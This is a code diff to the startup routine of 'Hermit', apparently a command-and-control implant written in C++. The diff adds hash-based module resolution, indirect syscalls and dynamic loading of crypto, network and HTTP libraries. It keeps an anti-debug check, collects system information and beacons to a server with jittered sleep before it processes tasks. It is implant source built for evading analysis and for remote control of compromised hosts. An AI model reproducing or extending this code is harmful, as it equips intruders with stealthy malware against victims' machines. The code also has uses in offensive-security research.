@@ -23,31 +23,94 @@ namespace Hermit
 		LPCWSTR 		lpKey,
 		LPCWSTR 		lpIV
 	) {
-		HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
-        if (!hNTDLL)
+		State::PSTATE pState = new State::STATE;
+
+		pState->pTeb = NtCurrentTeb();
+
+		// --------------------------------------------------------------------------
+		// Get module handlers and functions.
+		// --------------------------------------------------------------------------
+
+		HMODULE hNtdll = (HMODULE)Procs::GetModuleByHash(HASH_MODULE_NTDLL);
+        if (!hNtdll)
         {
 			return;
         }
-		HMODULE hKernel32DLL = LoadLibrary(L"kernel32.dll");
-		if (!hKernel32DLL)
+		pState->hNTDLL = hNtdll;
+
+		HMODULE hKernel32 = (HMODULE)Procs::GetModuleByHash(HASH_MODULE_KERNEL32);
+		if (!hKernel32)
 		{
 			return;
 		}
-        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
-        if (!hWinHTTPDLL)
-        {
-			FreeLibrary(hNTDLL);
-            return;
-        }
+		pState->hKernel32DLL = hKernel32;
 
-		State::PSTATE pState = new State::STATE;
+		// Get functions
+		pState->pProcs = Procs::FindProcs(
+			hNtdll,
+			hKernel32,
+			bIndirectSyscalls
+		);
 
-		pState->pCrypt				= Crypt::InitCrypt(lpKey, lpIV);
-		pState->pTeb 				= NtCurrentTeb();
-		pState->hKernel32DLL		= hKernel32DLL;
-		pState->hNTDLL				= hNTDLL;
-		pState->hWinHTTPDLL			= hWinHTTPDLL;
-		pState->pProcs 				= Procs::FindProcs(hNTDLL, hKernel32DLL, hWinHTTPDLL, bIndirectSyscalls);
+		// --------------------------------------------------------------------------
+		// Get other module handlers functions.
+		// --------------------------------------------------------------------------
+
+		WCHAR wAdvapi32DLL[] = L"advapi32.dll";
+		HMODULE hAdvapi32 = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wAdvapi32DLL);
+		if (!hAdvapi32)
+		{
+			return;
+		}
+		pState->hAdvapi32DLL = hAdvapi32;
+
+		WCHAR wBcryptDLL[] = L"bcrypt.dll";
+		HMODULE hBcrypt = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wBcryptDLL);
+		if (!hBcrypt)
+		{
+			return;
+		}
+		pState->hBcryptDLL = hBcrypt;
+
+		WCHAR wCrypt32DLL[] = L"crypt32.dll";
+		HMODULE hCrypt32 = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wCrypt32DLL);
+		if (!hCrypt32)
+		{
+			return;
+		}
+		pState->hCrypt32DLL = hCrypt32;
+
+		WCHAR wNetapi32DLL[] = L"netapi32.dll";
+		HMODULE hNetapi32 = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wNetapi32DLL);
+		if (!hNetapi32)
+		{
+			return;
+		}
+		pState->hNetapi32DLL = hNetapi32;
+
+		WCHAR wWinHttpDll[] = L"winhttp.dll";
+		HMODULE hWinHttp = (HMODULE)Procs::LoadModule(pState->pProcs, (LPWSTR)wWinHttpDll);
+		if (!hWinHttp)
+		{
+			return;
+		}
+		pState->hWinHTTPDLL = hWinHttp;
+
+		// Get functions
+		Procs::FindProcsMisc(
+			pState->pProcs,
+			hAdvapi32,
+			hBcrypt,
+			hCrypt32,
+			hNetapi32,
+			hWinHttp
+		);
+
+		// --------------------------------------------------------------------------
+		// Store states others.
+		// --------------------------------------------------------------------------
+
+		pState->pCrypt				= Crypt::InitCrypt(pState->pProcs, lpKey, lpIV);
 		pState->hInstance 			= hInstance;
 		pState->nCmdShow 			= nCmdShow;
 		pState->lpPayloadType 		= lpPayloadType;
@@ -70,15 +133,24 @@ namespace Hermit
 		// pState->pSocket 			= NULL;
 		pState->bQuit 				= FALSE;
 
+		// --------------------------------------------------------------------------
+		// Anti-Debug
+		// --------------------------------------------------------------------------
+
 		// Anti-Debug
 		if (bAntiDebug)
 		{
 			Technique::AntiDebug::StopIfDebug(pState->pProcs);
 		}
 
+		// --------------------------------------------------------------------------
+		// Get initial info and http handlers.
+		// --------------------------------------------------------------------------
+
 		// Get system information
 		std::wstring wInfoJson = Handler::GetInitialInfoJSON(pState);
 
+		// Initialize WinHttp handlers
 		Handler::HTTPInit(pState);
 		if (pState->hSession == NULL || pState->hConnect == NULL)
 		{
@@ -89,7 +161,10 @@ namespace Hermit
 
 		// WinHttpSetStatusCallback(hSession, WinHttpCallback, WINHTTP_CALLBACK_FLAG_SECURE_FAILURE, 0);
 
-		// Check-In
+		// --------------------------------------------------------------------------
+		// Check-in
+		// --------------------------------------------------------------------------
+
 		do
 		{
 			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
@@ -105,7 +180,10 @@ namespace Hermit
 			}
 		} while (1 == 1);
 
-		// Tasks
+		// --------------------------------------------------------------------------
+		// Process tasks
+		// --------------------------------------------------------------------------
+
 		do
 		{
 			Utils::Random::RandomSleep(pState->nSleep, pState->nJitter);
